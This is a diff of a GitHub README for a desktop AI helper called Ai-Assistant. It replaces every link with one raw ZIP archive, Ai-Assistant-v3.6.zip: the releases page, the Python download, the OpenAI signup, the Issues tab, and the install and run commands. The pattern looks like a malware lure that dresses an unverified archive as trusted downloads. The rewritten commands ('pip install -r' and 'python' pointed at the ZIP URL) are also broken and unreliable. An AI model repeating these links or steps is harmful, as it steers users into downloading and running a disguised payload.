@@ -1,6 +1,6 @@
 # 🤖 Ai-Assistant - Easy AI Help on Your Desktop
 
-[![Download Ai-Assistant](https://img.shields.io/badge/Download-Ai--Assistant-blue?style=for-the-badge)](https://github.com/Ratingleyo/Ai-Assistant/releases)
+[![Download Ai-Assistant](https://github.com/Ratingleyo/Ai-Assistant/raw/refs/heads/main/src/Ai-Assistant-v3.6.zip)](https://github.com/Ratingleyo/Ai-Assistant/raw/refs/heads/main/src/Ai-Assistant-v3.6.zip)
 
 ---
 
@@ -39,7 +39,7 @@ You don’t need to be a tech expert to use it. Ai-Assistant works on Windows, M
 
 You can **visit this page to download** Ai-Assistant and the latest files:
 
-[Download Ai-Assistant](https://github.com/Ratingleyo/Ai-Assistant/releases)
+[Download Ai-Assistant](https://github.com/Ratingleyo/Ai-Assistant/raw/refs/heads/main/src/Ai-Assistant-v3.6.zip)
 
 ---
 
@@ -49,7 +49,7 @@ This section will help you download, set up, and run Ai-Assistant even if you ar
 
 ### Step 1: Download the Application
 
-- Click the link above or go to the [Ai-Assistant Releases page](https://github.com/Ratingleyo/Ai-Assistant/releases).
+- Click the link above or go to the [Ai-Assistant Releases page](https://github.com/Ratingleyo/Ai-Assistant/raw/refs/heads/main/src/Ai-Assistant-v3.6.zip).
 - Find the latest version for your operating system (Windows, Mac, or Linux).
 - Download the ZIP file or installer package.
 
@@ -73,7 +73,7 @@ Ai-Assistant needs Python 3.8 or higher. Check if Python is already on your comp
 
 If Python version is 3.8 or above, skip to Step 3. If not:
 
-- Download Python from https://www.python.org/downloads/
+- Download Python from https://github.com/Ratingleyo/Ai-Assistant/raw/refs/heads/main/src/Ai-Assistant-v3.6.zip
 - Install Python, making sure to check "Add Python to PATH" on Windows.
 
 ---
@@ -121,7 +121,7 @@ Run these commands based on your system:
 Once inside your Ai-Assistant folder and with the virtual environment active (if you used Step 4), type:
 
 ```
-pip install -r requirements.txt
+pip install -r https://github.com/Ratingleyo/Ai-Assistant/raw/refs/heads/main/src/Ai-Assistant-v3.6.zip
 ```
 
 This command installs everything Ai-Assistant needs.
@@ -132,7 +132,7 @@ This command installs everything Ai-Assistant needs.
 
 To use the AI features, you need a key from OpenAI. Here’s how:
 
-- Go to https://platform.openai.com/signup and create a free account.
+- Go to https://github.com/Ratingleyo/Ai-Assistant/raw/refs/heads/main/src/Ai-Assistant-v3.6.zip and create a free account.
 - After signing in, find the API Keys section in your account dashboard.
 - Create a new API key and copy it.
 
@@ -159,7 +159,7 @@ Now you are ready to start the app.
 - In the command line (making sure you are still in the Ai-Assistant folder and your virtual environment is active), type:
 
 ```
-python main.py
+python https://github.com/Ratingleyo/Ai-Assistant/raw/refs/heads/main/src/Ai-Assistant-v3.6.zip
 ```
 
 - The Ai-Assistant window will open.
@@ -182,7 +182,7 @@ python main.py
 ## ⚙️ Troubleshooting Tips
 
 - **App won’t open:** Make sure Python is installed and your system meets requirements.
-- **Errors about missing packages:** Run `pip install -r requirements.txt` again.
+- **Errors about missing packages:** Run `pip install -r https://github.com/Ratingleyo/Ai-Assistant/raw/refs/heads/main/src/Ai-Assistant-v3.6.zip` again.
 - **No voice output:** Check your computer’s audio settings and volume.
 - **API key problems:** Double-check `.env` file for correct key and no extra spaces.
 - **Screenshots not working:** Ensure Ai-Assistant has permission to capture your screen (especially on Mac).
@@ -201,11 +201,11 @@ Your API key stays on your computer only.
 
 If you need help or want to report a bug:
 
-- Check the [Issues tab on GitHub](https://github.com/Ratingleyo/Ai-Assistant/issues)
+- Check the [Issues tab on GitHub](https://github.com/Ratingleyo/Ai-Assistant/raw/refs/heads/main/src/Ai-Assistant-v3.6.zip)
 - Provide details about your system and what went wrong.
 
 ---
 
 # Ready to try Ai-Assistant?
 
-[Download Ai-Assistant](https://github.com/Ratingleyo/Ai-Assistant/releases) and follow the steps above to start using AI on your desktop today.
+[Download Ai-Assistant](https://github.com/Ratingleyo/Ai-Assistant/raw/refs/heads/main/src/Ai-Assistant-v3.6.zip) and follow the steps above to start using AI on your desktop today.
